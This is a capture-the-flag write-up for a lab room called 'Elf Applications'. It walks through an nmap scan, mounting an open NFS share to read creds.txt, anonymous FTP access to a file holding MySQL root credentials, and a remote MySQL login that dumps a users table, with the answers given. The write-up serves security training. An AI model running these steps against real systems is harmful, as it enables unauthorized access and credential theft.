# Day 11 - Elf Applications

**Date:** 02, June, 2021

**Author:** Dhilip Sanjay S

---

## Enumeration

### Nmap

```bash
$ nmap -sC -sV -p- -oN nmap.out 10.10.224.175
Nmap scan report for 10.10.224.175
Host is up (0.15s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: PASV failed: 500 OOPS: invalid pasv_address
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.7.91
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 14:6f:fc:4d:82:43:eb:e9:6e:f3:0e:01:38:f0:cb:23 (RSA)
|   256 83:33:03:d0:b4:1d:cb:8e:59:6f:13:14:c5:a2:75:b3 (ECDSA)
|_  256 ec:b1:63:c0:6d:98:fd:be:76:31:cd:b9:78:35:2a:bf (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      40167/tcp6  nlockmgr
|   100021  1,3,4      42331/udp   nlockmgr
|   100021  1,3,4      46081/tcp   nlockmgr
|   100021  1,3,4      52176/udp6  nlockmgr
|   100024  1          34164/udp   status
|   100024  1          41187/tcp6  status
|   100024  1          42135/tcp   status
|   100024  1          58660/udp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
3306/tcp  open  mysql    MySQL 5.7.28
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.28
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, IgnoreSigpipes, FoundRows, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsCompression, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, LongPassword, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x07<\x01\x01ur9I<;5,\x0C3W
| \x1AT[\x15
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.28_Auto_Generated_Server_Certificate
| Not valid before: 2019-12-10T23:10:36
|_Not valid after:  2029-12-07T23:10:36
|_ssl-date: TLS randomness does not represent time
20048/tcp open  mountd   1-3 (RPC #100005)
42135/tcp open  status   1 (RPC #100024)
46081/tcp open  nlockmgr 1-4 (RPC #100021)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  2 23:27:30 2021 -- 1 IP address (1 host up) scanned in 559.62 seconds
```

---
## Questions

### What is the password inside the creds.txt file?
- **Answer:** securepassword123
- **Steps to Reproduce:** 

```bash
$ showmount -e 10.10.224.175
Export list for 10.10.224.175:
/opt/files *

$  mount 10.10.224.175:/ /mnt/elfapp/ 
$  cd /mnt/elfapp/
$ ls
opt

$ cd opt/files/
$ ls
creds.txt

$ cat creds.txt 
the password is securepassword123
```

---

### What is the name of the file running on port 21?
- **Answer:** file.txt
- **Steps to Reproduce:** 
    - Anonymous login in ftp:

    ```bash
    $ ftp 10.10.224.175
    Connected to 10.10.224.175.
    220 (vsFTPd 3.0.2)
    Name (10.10.224.175:root): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    -rwxrwxrwx    1 0        0              39 Dec 10  2019 file.txt
    drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
    d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
    -rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
    226 Directory send OK.
    ```

    - Reading `file.txt`:

    ```bash
    ftp> get file.txt
    local: file.txt remote: file.txt
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for file.txt (39 bytes).
    226 Transfer complete.
    39 bytes received in 0.00 secs (362.7232 kB/s)
    ftp> exit
    221 Goodbye

    $  cat file.txt 
    remember to wipe mysql:
    root
    ff912ABD*
    ```
    
---

### What is the password after enumerating the database?
- **Answer:** bestpassword
- **Steps to Reproduce:** 
    - The password in the file must be the password for root user in MySQL.
    - So, just google how to connect to remote mysql instance and then enumerate the database.

    ```bash
    $ mysql -u root -h 10.10.224.175 -p
    Enter password: 
    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    Your MySQL connection id is 10
    Server version: 5.7.28 MySQL Community Server (GPL)

    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    MySQL [(none)]> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | data               |
    | mysql              |
    | performance_schema |
    | sys                |
    +--------------------+
    5 rows in set (0.164 sec)

    MySQL [(none)]> use data
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Database changed
    MySQL [data]> show tables;
    +----------------+
    | Tables_in_data |
    +----------------+
    | USERS          |
    +----------------+
    1 row in set (0.154 sec)

    MySQL [data]> select * from USERS;
    +-------+--------------+
    | name  | password     |
    +-------+--------------+
    | admin | bestpassword |
    +-------+--------------+
    1 row in set (0.157 sec)
    ```
    
---

## References

- [MySQL Remote Connection](https://phoenixnap.com/kb/mysql-remote-connection)